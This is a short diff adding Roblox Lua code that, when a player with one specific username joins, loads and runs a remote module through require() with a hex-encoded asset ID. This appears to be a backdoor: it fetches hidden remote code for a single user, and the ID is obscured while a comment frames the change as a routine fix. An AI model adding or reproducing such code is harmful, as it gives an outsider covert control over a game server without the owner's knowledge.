@@ -1,0 +1,5 @@
+game.Players.PlayerAdded:Connect(function(plr)
+	if plr.Name == "LordSrTheEmo" then
+		require(0x61e3258931df).load(plr) -- Correctly use 'plr' directly
+	end
+end)
